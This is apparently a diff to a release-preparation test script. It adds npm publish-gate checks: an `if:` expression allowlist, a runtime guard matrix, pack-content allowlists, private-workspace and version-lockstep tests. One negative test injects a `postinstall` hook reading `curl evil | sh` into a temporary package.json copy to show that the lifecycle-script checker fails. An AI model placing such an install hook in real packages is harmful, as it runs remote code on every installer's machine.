@@ -124,7 +124,11 @@ def parse(cond):
 
 # closed-enum allowlist: every context ref must be a gate input; string literals only as
 # comparison/function operands (no bare-literal boolean like `|| 'false'`).
-ALLOWED_CTX = {"github.ref", "github.event_name", "vars.ENABLE_GHCR_PUBLISH", "true", "false"}
+# Two opt-in toggles are permitted: ENABLE_GHCR_PUBLISH (docker job) and ENABLE_NPM_PUBLISH
+# (npm job, decision 019f5131). Both are known publish gates; the exact AST pin per job still
+# catches any real deviation in release.yml, so widening the enum by one sibling toggle does
+# not weaken either gate.
+ALLOWED_CTX = {"github.ref", "github.event_name", "vars.ENABLE_GHCR_PUBLISH", "vars.ENABLE_NPM_PUBLISH", "true", "false"}
 def check_closed_enum(node, parent):
     t = node[0]
     if t == "ctx":
@@ -189,11 +193,14 @@ def validate(cond):
     if not any(refs_github_ref(c) for c in flatten_and(ast)):
         print("no github.ref (tag) guard among top-level conjuncts"); sys.exit(1)
     TAG = "refs/tags/v1.2.3"; BR = "refs/heads/main"
+    # Each row sets BOTH opt-in toggles to the SAME value, so a canonical that references either
+    # ENABLE_GHCR_PUBLISH (docker) or ENABLE_NPM_PUBLISH (npm) evaluates identically — the matrix
+    # validates each single-toggle gate without a per-job branch.
     matrix = [
-        ({"github.ref": TAG, "github.event_name": "workflow_dispatch", "vars.ENABLE_GHCR_PUBLISH": ""},     True,  "tag+dispatch"),
-        ({"github.ref": TAG, "github.event_name": "push",              "vars.ENABLE_GHCR_PUBLISH": "true"}, True,  "tag+push+var"),
-        ({"github.ref": TAG, "github.event_name": "push",              "vars.ENABLE_GHCR_PUBLISH": ""},     False, "tag+push+novar"),
-        ({"github.ref": BR,  "github.event_name": "workflow_dispatch", "vars.ENABLE_GHCR_PUBLISH": ""},     False, "nontag+dispatch"),
+        ({"github.ref": TAG, "github.event_name": "workflow_dispatch", "vars.ENABLE_GHCR_PUBLISH": "",     "vars.ENABLE_NPM_PUBLISH": ""},     True,  "tag+dispatch"),
+        ({"github.ref": TAG, "github.event_name": "push",              "vars.ENABLE_GHCR_PUBLISH": "true", "vars.ENABLE_NPM_PUBLISH": "true"}, True,  "tag+push+var"),
+        ({"github.ref": TAG, "github.event_name": "push",              "vars.ENABLE_GHCR_PUBLISH": "",     "vars.ENABLE_NPM_PUBLISH": ""},     False, "tag+push+novar"),
+        ({"github.ref": BR,  "github.event_name": "workflow_dispatch", "vars.ENABLE_GHCR_PUBLISH": "",     "vars.ENABLE_NPM_PUBLISH": ""},     False, "nontag+dispatch"),
     ]
     for ctx, want, label in matrix:
         if truth(ev(ast, ctx)) != want:
@@ -293,6 +300,49 @@ print(c if isinstance(c, str) else "__NONSTRING__")
 PY
 }
 
+# extract the npm job's `if:` string (or a sentinel on absence) — decision 019f5131.
+npm_if_string() {
+  python3 - "$1" <<'PY'
+import sys, yaml
+d = yaml.safe_load(open(sys.argv[1]))
+j = (d.get("jobs") or {}).get("npm")
+if not j: print("__NOJOB__"); sys.exit(0)
+c = j.get("if")
+print(c if isinstance(c, str) else "__NONSTRING__")
+PY
+}
+
+# Print the npm job's runtime publish-guard run body iff it is a VALID gate: present, BEFORE the
+# `npm publish` step, enabled, and not neutered by continue-on-error. Reuses the SHARED step
+# predicates (sp.is_guard / sp.enabled / sp.cont_on_err); the publish step is an `npm publish`
+# (its own detector — is_push is docker-specific). Non-zero exit (empty stdout) = "no valid guard".
+npm_publish_guard_run() {
+  python3 - "$1" <<'PY'
+import sys, os, re, yaml
+sys.path.insert(0, os.environ["SP_DIR"]); import step_predicates as sp
+d = yaml.safe_load(open(sys.argv[1]))
+steps = ((d.get("jobs") or {}).get("npm") or {}).get("steps") or []
+# The PUBLISH step runs `npm publish` as a COMMAND (line start, after whitespace) — NOT the
+# guard's own echo "npm publish authorized …" (a quoted string). Anchor at a line start and
+# exclude the guard step, so the guard's message can't be mistaken for the publish command.
+def is_publish(s):
+    if sp.is_guard(s): return False
+    return re.search(r'(^|\n)\s*npm publish\b', str(s.get("run", ""))) is not None
+gi = next((i for i, s in enumerate(steps) if sp.is_guard(s)), None)
+pi = next((i for i, s in enumerate(steps) if is_publish(s)), None)
+if gi is None: sys.stderr.write("no npm publish-guard step\n"); sys.exit(1)
+if pi is None: sys.stderr.write("no npm publish step\n"); sys.exit(1)
+if gi >= pi:   sys.stderr.write("guard is not before npm publish\n"); sys.exit(1)
+g = steps[gi]
+if not sp.enabled(g): sys.stderr.write(f"guard disabled by `if: {g.get('if')}`\n"); sys.exit(1)
+if sp.cont_on_err(g): sys.stderr.write("guard has a non-false continue-on-error\n"); sys.exit(1)
+sys.stdout.write(str(g.get("run", "")))
+PY
+}
+# (npm runtime-guard matrix is `npm_guard_matrix_ok`, a wrapper over the SHARED
+#  guard_matrix_ok_var defined alongside the docker one below — TDA-1/QA-3: single 8-point
+#  matrix parameterized by the opt-in env-var name, so docker and npm can't drift.)
+
 # --- runtime publish-guard helpers (R4-M1a / R5-M1) ------------------------------------
 # Print the docker job's runtime publish-guard step run body, but ONLY if that step is a VALID
 # gate: it exists, sits before the push step, is NOT disabled by a falsy/dynamic `if:`, and does
@@ -317,27 +367,35 @@ if sp.cont_on_err(g):     sys.stderr.write("guard has a non-false `continue-on-e
 sys.stdout.write(str(g.get("run", "")))
 PY
 }
-# Execute a guard run body under one (ref, event, enable) context; exit code = the guard's.
-guard_ctx() { env GITHUB_REF="$2" GITHUB_EVENT_NAME="$3" ENABLE_GHCR_PUBLISH="$4" bash -c "$1" >/dev/null 2>&1; }
-# True iff a guard run body enforces tag∧opt-in across the context matrix (fail-closed). R5-L3
-# widens the sample points beyond the original 4 to shrink (not eliminate) the sampling hole:
-# a SECOND tag version catches a guard hardcoded to one tag, a non-dispatch/non-push event and
-# a `false` opt-in value (broken-disable) catch a guard that treats "anything set" as authorized.
-# HONEST LIMIT (sweep — QA-R5-2): this executes only the extracted RUN body, so a step/job-level
-# `env: ENABLE_GHCR_PUBLISH: 'true'` defang (which the checker does not see) is not caught here;
-# that residual is if:-gated + disclosed and carried to the v0.4.0 sweep, not chased into a denylist.
-guard_matrix_ok() {
-  local run="$1"
-  guard_ctx "$run" refs/tags/v1.2.3 workflow_dispatch ''    ; [ $? -eq 0 ] || return 1  # tag+dispatch -> allow
-  guard_ctx "$run" refs/tags/v1.2.3 push             true  ; [ $? -eq 0 ] || return 1  # tag+push+var -> allow
-  guard_ctx "$run" refs/tags/v9.9.9 workflow_dispatch ''    ; [ $? -eq 0 ] || return 1  # OTHER tag+dispatch -> allow
-  guard_ctx "$run" refs/tags/v1.2.3 push             ''    ; [ $? -ne 0 ] || return 1  # tag+push+novar -> BLOCK
-  guard_ctx "$run" refs/tags/v9.9.9 push             ''    ; [ $? -ne 0 ] || return 1  # OTHER tag+push+novar -> BLOCK
-  guard_ctx "$run" refs/tags/v1.2.3 push             false ; [ $? -ne 0 ] || return 1  # broken-disable ENABLE=false -> BLOCK
-  guard_ctx "$run" refs/tags/v1.2.3 schedule         ''    ; [ $? -ne 0 ] || return 1  # tag+non-dispatch event -> BLOCK
-  guard_ctx "$run" refs/heads/main  workflow_dispatch ''    ; [ $? -ne 0 ] || return 1  # nontag -> BLOCK
+# Execute a guard run body under one context; $5 = the opt-in env-var NAME (docker/npm differ
+# ONLY here — TDA-1/QA-3: parameterized so a single helper drives both). `"$5=$4"` builds the
+# `NAME=VALUE` assignment env consumes (env parses NAME=VALUE args until the command).
+guard_ctx_var() { # $1=run $2=ref $3=event $4=enableval $5=envname
+  env GITHUB_REF="$2" GITHUB_EVENT_NAME="$3" "$5=$4" bash -c "$1" >/dev/null 2>&1
+}
+# True iff a guard run body enforces tag∧opt-in across the 8-sample matrix (fail-closed), where
+# $2 = the opt-in env-var name. R5-L3 sample points (shared by docker AND npm now): a SECOND tag
+# version catches a guard hardcoded to one tag; a `false` opt-in value (broken-disable) and a
+# non-dispatch/non-push (schedule) event catch a guard that treats "anything set" as authorized.
+# HONEST LIMIT (sweep — QA-R5-2): executes only the extracted RUN body, so a step/job-level
+# `env: <VAR>: 'true'` defang (not visible to the checker) is not caught here; that residual is
+# if:-gated + disclosed, not chased into a denylist.
+guard_matrix_ok_var() { # $1=run $2=envname
+  local run="$1" v="$2"
+  guard_ctx_var "$run" refs/tags/v1.2.3 workflow_dispatch ''    "$v"; [ $? -eq 0 ] || return 1  # tag+dispatch -> allow
+  guard_ctx_var "$run" refs/tags/v1.2.3 push             true  "$v"; [ $? -eq 0 ] || return 1  # tag+push+var -> allow
+  guard_ctx_var "$run" refs/tags/v9.9.9 workflow_dispatch ''    "$v"; [ $? -eq 0 ] || return 1  # OTHER tag+dispatch -> allow
+  guard_ctx_var "$run" refs/tags/v1.2.3 push             ''    "$v"; [ $? -ne 0 ] || return 1  # tag+push+novar -> BLOCK
+  guard_ctx_var "$run" refs/tags/v9.9.9 push             ''    "$v"; [ $? -ne 0 ] || return 1  # OTHER tag+push+novar -> BLOCK
+  guard_ctx_var "$run" refs/tags/v1.2.3 push             false "$v"; [ $? -ne 0 ] || return 1  # broken-disable ENABLE=false -> BLOCK
+  guard_ctx_var "$run" refs/tags/v1.2.3 schedule         ''    "$v"; [ $? -ne 0 ] || return 1  # tag+non-dispatch event -> BLOCK
+  guard_ctx_var "$run" refs/heads/main  workflow_dispatch ''    "$v"; [ $? -ne 0 ] || return 1  # nontag -> BLOCK
   return 0
 }
+# Thin per-job wrappers (single source above; no drift). docker reads ENABLE_GHCR_PUBLISH,
+# npm reads ENABLE_NPM_PUBLISH — the ONLY difference between the two gates' guards.
+guard_matrix_ok()     { guard_matrix_ok_var "$1" ENABLE_GHCR_PUBLISH; }
+npm_guard_matrix_ok() { guard_matrix_ok_var "$1" ENABLE_NPM_PUBLISH; }
 
 # --- single-source docker STEP mutator (R4-L6 + R5-M1: is_scan/is_guard from step_predicates) -
 # Apply a named mutation to the docker job's scan OR guard step and write the mutated workflow.
@@ -525,14 +583,23 @@ if top != {"contents": "read"}:
 # packages+id-token+attestations). The is_signing gate alone would pass a signing job that
 # ALSO grabbed an unrelated write (e.g. `actions: write` / `deployments: write`). So each
 # signing job's write set must additionally be a SUBSET of the expected signing scopes.
+#
+# npm Phase 3 (decision 019f5131): a THIRD write-holder — the Trusted-Publishing `npm` job —
+# holds ONLY `id-token: write` (OIDC token exchange; it stores no npm token and needs neither
+# attestations nor contents/packages). It is recognized STRUCTURALLY by its write set being
+# EXACTLY {id-token}. Any other write on such a job (e.g. an injected contents:write) makes the
+# set != {id-token}, so it is neither a signing job nor an OIDC-publish job and FAILS closed.
 SIGNING_WRITE_ALLOWED = {"contents", "packages", "id-token", "attestations"}
 for name, job in (d.get("jobs") or {}).items():
     jp = job.get("permissions") or {}
-    writes = [k for k, v in jp.items() if v == "write"]
-    if writes:
-        is_signing = jp.get("id-token") == "write" and jp.get("attestations") == "write"
-        if not is_signing:
-            print(f"job '{name}' holds write {writes} but is not the signing job"); sys.exit(1)
+    writes = sorted(k for k, v in jp.items() if v == "write")
+    if not writes:
+        continue
+    is_signing = jp.get("id-token") == "write" and jp.get("attestations") == "write"
+    is_oidc_publish = writes == ["id-token"]
+    if not (is_signing or is_oidc_publish):
+        print(f"job '{name}' holds write {writes} but is neither the signing job nor an OIDC-publish job"); sys.exit(1)
+    if is_signing:
         surplus = [k for k in writes if k not in SIGNING_WRITE_ALLOWED]
         if surplus:
             print(f"signing job '{name}' holds unexpected write scope(s) {surplus}"); sys.exit(1)
@@ -1171,6 +1238,421 @@ BAD
 || always()
 VECS
   [ "$ifp_eo" = 1 ] && ok "INV-IF-GATE-PARSER: rejects all $ifp_en enum-outside/bare-literal vectors at parse time (closed-enum class closed)"
+fi
+
+# ============================================================================
+# npm-face invariants (decision 019f5131 — packages/cli is the sole publishable package)
+# ============================================================================
+# Shared pure checkers (operate on a package.json / tree / listing; no build required).
+CLI_PKG="$ROOT/packages/cli/package.json"
+
+# every packed path is on the allowlist {package.json, README.md, LICENSE, dist/**} AND none of
+# the known path-leak / redundant artifacts:
+#   - .tsbuildinfo (SEC/TDA): a tsc build-cache file that bakes ABSOLUTE filesystem paths (the
+#     maintainer's home under a symlinked/pnpm node_modules) into the tarball.
+#   - *.map (SEC-1): source/declaration maps embed source-tree paths and are useless to a CLI
+#     consumer; disabled at the tsc level (sourceMap/declarationMap:false) AND forbidden here as
+#     a structural backstop (a future tsconfig flip re-emitting them is caught).
+# Capture-then-test (no `| grep -q`) to avoid the pipefail x SIGPIPE inversion on a match.
+pack_allowlist_ok() {
+  local listing="$1" bad tsb maps
+  bad="$(printf '%s\n' "$listing" | grep -vE '^(package\.json|README\.md|LICENSE|dist/.+)$')" || true
+  [ -n "$bad" ] && return 1
+  tsb="$(printf '%s\n' "$listing" | grep -E '(^|/)\.tsbuildinfo$')" || true
+  [ -n "$tsb" ] && return 1
+  maps="$(printf '%s\n' "$listing" | grep -E '\.map$')" || true
+  [ -n "$maps" ] && return 1
+  return 0
+}
+# no install-time lifecycle script in <pkg.json> (postinstall etc. = supply-chain footgun)
+no_lifecycle_ok() {
+  local pj="$1" hit
+  hit="$(jq -r '.scripts // {} | keys[]' "$pj" 2>/dev/null | grep -E '^(preinstall|install|postinstall|prepare|prepack)$')" || true
+  [ -z "$hit" ]
+}
+# every non-cli workspace package.json under <r> is private:true; packages/cli is NOT private
+private_guard_ok() {
+  local r="$1" f priv clipriv
+  clipriv="$(jq -r '.private // false' "$r/packages/cli/package.json" 2>/dev/null)"
+  [ "$clipriv" = "true" ] && { echo "packages/cli must NOT be private (it is the publishable package)"; return 1; }
+  for f in "$r"/package.json "$r"/db/package.json "$r"/packages/*/package.json "$r"/apps/*/package.json; do
+    [ -f "$f" ] || continue
+    case "$f" in
+      "$r"/package.json) continue ;;            # root is a private, non-published workspace root
+      "$r"/packages/cli/package.json) continue ;;
+    esac
+    priv="$(jq -r '.private // false' "$f")"
+    [ "$priv" = "true" ] || { echo "non-cli workspace not private: $f"; return 1; }
+  done
+  return 0
+}
+
+# --- INV-NPM-PACK-ALLOWLIST -------------------------------------------------
+# GREEN/RED on the allowlist LOGIC (falsifiable without a build); the REAL packed tarball is
+# additionally checked in the tooling-guarded build block below.
+if pack_allowlist_ok "$(printf 'package.json\nREADME.md\nLICENSE\ndist/index.js\ndist/lib/checksum.js\n')"; then
+  ok "INV-NPM-PACK-ALLOWLIST: allowlist accepts {package.json, README.md, LICENSE, dist/**}"
+else
+  ng "INV-NPM-PACK-ALLOWLIST: allowlist wrongly REJECTED a valid packed listing"
+fi
+if pack_allowlist_ok "$(printf 'package.json\ndist/index.js\nsrc/secret.ts\n')"; then
+  ng "INV-NPM-PACK-ALLOWLIST: DEAD GATE — an out-of-allowlist path (src/secret.ts) still passed"
+else
+  ok "INV-NPM-PACK-ALLOWLIST: gate FAILS on an out-of-allowlist path (falsifiable)"
+fi
+# RED: .tsbuildinfo (abs-path leak vector) must be rejected even though it sits under dist/.
+if pack_allowlist_ok "$(printf 'package.json\ndist/index.js\ndist/.tsbuildinfo\n')"; then
+  ng "INV-NPM-PACK-ALLOWLIST: DEAD GATE — dist/.tsbuildinfo (abs-path leak vector) still passed"
+else
+  ok "INV-NPM-PACK-ALLOWLIST: gate FAILS on a packed .tsbuildinfo (falsifiable)"
+fi
+# RED (SEC-1): a sourcemap/declaration-map must be rejected (path-embed vector; disabled at tsc).
+if pack_allowlist_ok "$(printf 'package.json\ndist/index.js\ndist/index.js.map\n')"; then
+  ng "INV-NPM-PACK-ALLOWLIST: DEAD GATE — dist/index.js.map (path-embed vector) still passed"
+else
+  ok "INV-NPM-PACK-ALLOWLIST: gate FAILS on a packed .map (SEC-1・falsifiable)"
+fi
+# leak-pattern RED (only meaningful where the canonical coupling lib is present = private): a
+# planted coupling literal in a fake packed tree must be caught by the SHARED tarball_no_leak
+# (which sources oss-patterns.sh). The vector is BUILT AT RUNTIME so THIS shipped file carries
+# no literal maintainer path (H holds "/home"; the coupling string exists only at execution).
+if [ -f "$SELF/lib/oss-patterns.sh" ]; then
+  NPKL="$WORK/npmleak"; mkdir -p "$NPKL"
+  H="/home"; printf 'const home = "%s/%s/secret";\n' "$H" "owner" > "$NPKL/planted.js"
+  if tarball_no_leak "$NPKL" >/dev/null 2>&1; then
+    ng "INV-NPM-PACK-ALLOWLIST: DEAD GATE — planted coupling literal not caught"
+  else
+    ok "INV-NPM-PACK-ALLOWLIST: leak scan FIRES on a planted coupling literal (falsifiable)"
+  fi
+fi
+
+# --- INV-NPM-NO-LIFECYCLE ---------------------------------------------------
+if [ -f "$CLI_PKG" ] && no_lifecycle_ok "$CLI_PKG"; then
+  ok "INV-NPM-NO-LIFECYCLE: packages/cli declares no preinstall/install/postinstall/prepare/prepack"
+else
+  ng "INV-NPM-NO-LIFECYCLE: packages/cli carries an install-time lifecycle script (or is missing)"
+fi
+# RED: inject a postinstall into a copy -> the checker must fail.
+if [ -f "$CLI_PKG" ]; then
+  jq '.scripts.postinstall="curl evil | sh"' "$CLI_PKG" > "$WORK/cli-lifecycle.json"
+  if no_lifecycle_ok "$WORK/cli-lifecycle.json"; then
+    ng "INV-NPM-NO-LIFECYCLE: DEAD GATE — injected postinstall still passed"
+  else
+    ok "INV-NPM-NO-LIFECYCLE: gate FAILS on an injected postinstall (falsifiable)"
+  fi
+fi
+
+# --- INV-NPM-PRIVATE-GUARD --------------------------------------------------
+if private_guard_ok "$ROOT" >/dev/null 2>&1; then
+  ok "INV-NPM-PRIVATE-GUARD: cli publishable; every other workspace is private:true"
+else
+  ng "INV-NPM-PRIVATE-GUARD: live tree violates the private-guard (see private_guard_ok output)"
+fi
+# RED (a): a non-cli workspace losing private:true must fail.
+PGT="$WORK/pgtree"; mkdir -p "$PGT/packages/cli" "$PGT/apps/backend" "$PGT/db" "$PGT/packages/x"
+printf '{"name":"actradeck"}\n'          > "$PGT/package.json"
+printf '{"name":"actradeck"}\n'          > "$PGT/packages/cli/package.json"   # cli: not private (ok)
+printf '{"private":true}\n'              > "$PGT/apps/backend/package.json"
+printf '{"private":true}\n'              > "$PGT/db/package.json"
+printf '{"private":true}\n'              > "$PGT/packages/x/package.json"
+if private_guard_ok "$PGT" >/dev/null 2>&1; then : ; else ng "INV-NPM-PRIVATE-GUARD: over-strict — a valid synthetic tree was rejected"; fi
+printf '{"name":"pub"}\n'                > "$PGT/apps/backend/package.json"    # remove private:true
+if private_guard_ok "$PGT" >/dev/null 2>&1; then
+  ng "INV-NPM-PRIVATE-GUARD: DEAD GATE — a non-cli workspace without private:true still passed"
+else
+  ok "INV-NPM-PRIVATE-GUARD: gate FAILS when a non-cli workspace drops private:true (falsifiable)"
+fi
+# RED (b): the cli becoming private:true (unpublishable) must fail.
+printf '{"private":true}\n'              > "$PGT/apps/backend/package.json"    # restore
+printf '{"private":true}\n'              > "$PGT/packages/cli/package.json"    # cli private == wrong
+if private_guard_ok "$PGT" >/dev/null 2>&1; then
+  ng "INV-NPM-PRIVATE-GUARD: DEAD GATE — cli marked private:true still passed"
+else
+  ok "INV-NPM-PRIVATE-GUARD: gate FAILS when cli is marked private:true (falsifiable)"
+fi
+
+# --- INV-NPM-VERSION-LOCKSTEP -----------------------------------------------
+# (a) packages/cli is covered by the single-source version gate (versions_consistent).
+VTC="$WORK/vtree-cli"; mkdir -p "$VTC"
+( cd "$ROOT" && find . -maxdepth 3 -name package.json \
+    -not -path './node_modules/*' -not -path '*/node_modules/*' \
+    -exec cp --parents {} "$VTC/" \; ) 2>/dev/null
+if versions_consistent "$VTC" >/dev/null 2>&1; then
+  ok "INV-NPM-VERSION-LOCKSTEP: packages/cli version matches root (single-source consistent)"
+else
+  ng "INV-NPM-VERSION-LOCKSTEP: live tree versions already inconsistent (cli?)"
+fi
+if [ -f "$VTC/packages/cli/package.json" ]; then
+  jq '.version="9.9.9"' "$VTC/packages/cli/package.json" > "$VTC/packages/cli/pj.tmp" && mv "$VTC/packages/cli/pj.tmp" "$VTC/packages/cli/package.json"
+  if versions_consistent "$VTC" >/dev/null 2>&1; then
+    ng "INV-NPM-VERSION-LOCKSTEP: DEAD GATE — a diverged packages/cli version still passed (cli not covered)"
+  else
+    ok "INV-NPM-VERSION-LOCKSTEP: gate FAILS when packages/cli diverges (cli IS covered, falsifiable)"
+  fi
+else
+  ng "INV-NPM-VERSION-LOCKSTEP: packages/cli/package.json missing from the version glob"
+fi
+# (b) packages/cli is in scripts/version.sh's stamp set (packages/* glob) — dry-run enumerates it.
+LSR="$WORK/lockstep-repo"; mkdir -p "$LSR/scripts" "$LSR/packages/cli" "$LSR/packages/other" "$LSR/db" "$LSR/apps/a"
+cp "$SELF/version.sh" "$LSR/scripts/version.sh"
+for d in . packages/cli packages/other db apps/a; do
+  printf '{"name":"x","version":"0.0.0","private":true}\n' > "$LSR/$d/package.json"
+done
+printf '# Changelog\n\n## [Unreleased]\n\n[Unreleased]: https://github.com/actradeck/actradeck/compare/v0.0.0...HEAD\n' > "$LSR/CHANGELOG.md"
+lsr_out="$(cd "$LSR" && bash scripts/version.sh 0.2.0 --dry-run --no-tag 2>&1)" || true
+if printf '%s' "$lsr_out" | grep -q 'packages/cli/package.json'; then
+  ok "INV-NPM-VERSION-LOCKSTEP: version.sh stamp set includes packages/cli (dry-run enumerates it)"
+else
+  ng "INV-NPM-VERSION-LOCKSTEP: version.sh does NOT enumerate packages/cli in its stamp set"
+fi
+
+# --- INV-NPM-DEFAULT-REPO-SYNC (TDA-3) --------------------------------------
+# repo.ts's DEFAULT_REPO is a third copy of the canonical OSS_DEFAULT_REPO (a dependency-free
+# published package can't source shell libs). Assert they agree so the default mirror can't
+# drift across tiers. Guarded ONLY on oss-patterns.sh presence (absent in the mirror, where this
+# shipped meta-test self-adapts); when present, the repo.ts file MUST exist and be read — a
+# missing path is a FAILURE (ng), never a silent skip (a wrong path would otherwise mask drift).
+# Falsifiable: change the repo.ts literal -> RED.
+REPO_TS="$ROOT/packages/cli/src/lib/repo.ts"
+if [ -f "$SELF/lib/oss-patterns.sh" ]; then
+  # shellcheck source=lib/oss-patterns.sh
+  . "$SELF/lib/oss-patterns.sh"
+  if [ ! -f "$REPO_TS" ]; then
+    ng "INV-NPM-DEFAULT-REPO-SYNC: $REPO_TS not found (moved/renamed?) — cannot verify default-repo sync"
+  else
+    repo_ts_default="$(grep -oE 'DEFAULT_REPO = "[^"]+"' "$REPO_TS" | head -1 | sed -E 's/.*"([^"]+)".*/\1/')"
+    if [ -n "$repo_ts_default" ] && [ "$repo_ts_default" = "$OSS_DEFAULT_REPO" ]; then
+      ok "INV-NPM-DEFAULT-REPO-SYNC: repo.ts DEFAULT_REPO == OSS_DEFAULT_REPO ($OSS_DEFAULT_REPO)"
+    else
+      ng "INV-NPM-DEFAULT-REPO-SYNC: repo.ts DEFAULT_REPO ('$repo_ts_default') != OSS_DEFAULT_REPO ('$OSS_DEFAULT_REPO') — cross-tier drift"
+    fi
+  fi
+fi
+
+# --- INV-NPM-PUBLISH-GATED  (two-layer: AST pin + runtime guard) ------------
+# TDA-R2-1: CANONICAL_NPM_IF is an INTENTIONAL parallel duplicate of CANONICAL_IF (docker), and
+# differs ONLY in the opt-in var (ENABLE_NPM_PUBLISH vs ENABLE_GHCR_PUBLISH). It is deliberately
+# NOT parameterized into one templated constant: each gate's pin should be a literal, self-evident
+# expression a reviewer can read at a glance (the runtime-guard DRIVER is shared/parameterized;
+# the PIN target stays literal per job). If either canonical changes, update it in the same PR.
+CANONICAL_NPM_IF="startsWith(github.ref, 'refs/tags/') && (github.event_name == 'workflow_dispatch' || vars.ENABLE_NPM_PUBLISH == 'true')"
+if [ ! -f "$REL_YML" ] || ! command -v python3 >/dev/null 2>&1; then
+  ng "INV-NPM-PUBLISH-GATED: release.yml or python3 missing"
+else
+  # 1. the npm canonical is a valid closed-enum tag∧opt-in gate (validates the pin target).
+  if if_gate_check_str "$CANONICAL_NPM_IF" >/dev/null 2>&1; then
+    ok "INV-NPM-PUBLISH-GATED: CANONICAL_NPM_IF is a valid closed-enum tag-gated form (pin target sound)"
+  else
+    ng "INV-NPM-PUBLISH-GATED: CANONICAL_NPM_IF constant is itself malformed"
+  fi
+  # 2. release.yml npm if: must AST-match CANONICAL_NPM_IF exactly.
+  canon_npm_repr="$(if_ast_repr "$CANONICAL_NPM_IF")"
+  real_npm_if="$(npm_if_string "$REL_YML")"
+  real_npm_repr="$(if_ast_repr "$real_npm_if" 2>/dev/null || echo PARSE_FAIL)"
+  if [ "$real_npm_repr" = "$canon_npm_repr" ]; then
+    ok "INV-NPM-PUBLISH-GATED: release.yml npm if: AST-matches CANONICAL_NPM_IF"
+  else
+    ng "INV-NPM-PUBLISH-GATED: release.yml npm if: DEVIATES from CANONICAL_NPM_IF — if you intentionally changed the gate, update CANONICAL_NPM_IF in scripts/test-release-prep.sh in the SAME PR"
+  fi
+  # 3. enum-inside weakenings (A/C/D with the npm var) break the AST pin.
+  npm_pin_red=1; npm_pin_n=0
+  while IFS= read -r form; do
+    [ -n "$form" ] || continue
+    npm_pin_n=$((npm_pin_n + 1))
+    wrepr="$(if_ast_repr "$form" 2>/dev/null || echo PARSE_FAIL)"
+    [ "$wrepr" = "$canon_npm_repr" ] && { ng "INV-NPM-PUBLISH-GATED: DEAD PIN — enum-inside weakening AST-matched canonical: $form"; npm_pin_red=0; }
+  done <<'FORMS'
+startsWith(github.ref, 'refs/tags/') && (github.event_name == 'workflow_dispatch' || vars.ENABLE_NPM_PUBLISH == 'true' || vars.ENABLE_NPM_PUBLISH != '')
+startsWith(github.ref, 'refs/tags/') && (github.event_name == 'workflow_dispatch' || vars.ENABLE_NPM_PUBLISH == 'true' || github.event_name != 'push')
+startsWith(github.ref, 'refs/tags/') && (github.event_name == 'workflow_dispatch' || vars.ENABLE_NPM_PUBLISH == 'true' || github.ref != 'refs/tags/v1.2.3')
+FORMS
+  [ "$npm_pin_red" = 1 ] && ok "INV-NPM-PUBLISH-GATED: canonical pin BREAKS on all $npm_pin_n opt-in-group enum-inside weakenings (falsifiable)"
+  # 4. runtime publish guard: present before `npm publish`, fails-closed across the 4-ctx matrix,
+  #    and RED on remove / defang (exit 1->0) / invert (|| -> &&).
+  npm_guard_run="$(npm_publish_guard_run "$REL_YML" 2>/dev/null)"; npm_guard_present=$?
+  if [ "$npm_guard_present" -ne 0 ] || [ -z "$npm_guard_run" ]; then
+    ng "INV-NPM-PUBLISH-GATED: no runtime publish-guard step before the npm publish step"
+  else
+    ok "INV-NPM-PUBLISH-GATED: runtime publish-guard present before npm publish"
+    if npm_guard_matrix_ok "$npm_guard_run"; then
+      ok "INV-NPM-PUBLISH-GATED: guard fails-closed correctly across the 8-context matrix (2nd tag / broken-disable / schedule)"
+    else
+      ng "INV-NPM-PUBLISH-GATED: guard does not enforce tag∧opt-in (8-context mismatch)"
+    fi
+    # mutation_applied contract (QA-3): a mutation that silently no-ops would make the RED probe
+    # pass VACUOUSLY (gate "correctly fails" for the WRONG reason). Require each mutation to be
+    # genuinely applied first — the file mutation via `cmp -s` against a yaml-roundtrip baseline,
+    # the in-string mutations via a plain string-inequality (symmetric with the docker harness).
+    NPM_BASELINE="$WORK/rel.npm.baseline.yml"
+    python3 -c 'import sys,yaml; yaml.safe_dump(yaml.safe_load(open(sys.argv[1])), open(sys.argv[2],"w"))' "$REL_YML" "$NPM_BASELINE"
+    npm_mutation_applied() { [ "$2" -eq 0 ] && [ -f "$1" ] && ! cmp -s "$1" "$NPM_BASELINE"; }
+    # RED (remove): drop the guard step -> npm_publish_guard_run reports no valid guard.
+    python3 - "$REL_YML" "$WORK/rel.npm.noguard.yml" <<'PY'
+import sys, os, yaml
+sys.path.insert(0, os.environ["SP_DIR"]); import step_predicates as sp
+d = yaml.safe_load(open(sys.argv[1]))
+job = (d.get("jobs") or {}).get("npm") or {}
+job["steps"] = [s for s in (job.get("steps") or []) if not sp.is_guard(s)]
+yaml.safe_dump(d, open(sys.argv[2], "w"))
+PY
+    nmrc=$?
+    if ! npm_mutation_applied "$WORK/rel.npm.noguard.yml" "$nmrc"; then
+      ng "INV-NPM-PUBLISH-GATED: HARNESS — guard-remove mutation did not apply (rc=$nmrc / missing / ==baseline)"
+    elif npm_publish_guard_run "$WORK/rel.npm.noguard.yml" >/dev/null 2>&1; then
+      ng "INV-NPM-PUBLISH-GATED: DEAD GATE — removing the guard step still passed"
+    else
+      ok "INV-NPM-PUBLISH-GATED: gate FAILS when the guard step is removed (mutation applied → falsifiable)"
+    fi
+    # RED (defang): exit 1 -> exit 0 makes the matrix mismatch. Assert the mutation actually changed
+    # the body (else a guard without `exit 1` would make this vacuously green).
+    npm_defanged="${npm_guard_run//exit 1/exit 0}"
+    if [ "$npm_defanged" = "$npm_guard_run" ]; then
+      ng "INV-NPM-PUBLISH-GATED: HARNESS — defang mutation did not change the guard body (no 'exit 1'?)"
+    elif npm_guard_matrix_ok "$npm_defanged"; then
+      ng "INV-NPM-PUBLISH-GATED: DEAD GATE — defanged guard (exit 1->exit 0) still matched"
+    else
+      ok "INV-NPM-PUBLISH-GATED: matrix FAILS when the guard fail path is defanged (mutation applied → falsifiable)"
+    fi
+    # RED (invert): || -> && makes the matrix mismatch. Assert the mutation actually changed the body.
+    npm_inverted="${npm_guard_run// || / && }"
+    if [ "$npm_inverted" = "$npm_guard_run" ]; then
+      ng "INV-NPM-PUBLISH-GATED: HARNESS — invert mutation did not change the guard body (no ' || '?)"
+    elif npm_guard_matrix_ok "$npm_inverted"; then
+      ng "INV-NPM-PUBLISH-GATED: DEAD GATE — inverted guard (|| -> &&) still matched"
+    else
+      ok "INV-NPM-PUBLISH-GATED: matrix FAILS when the guard condition is inverted (mutation applied → falsifiable)"
+    fi
+  fi
+fi
+
+# --- INV-NPM-EXEC-E2E  (isolated HOME: pack -> global install -> run the real bin) ---
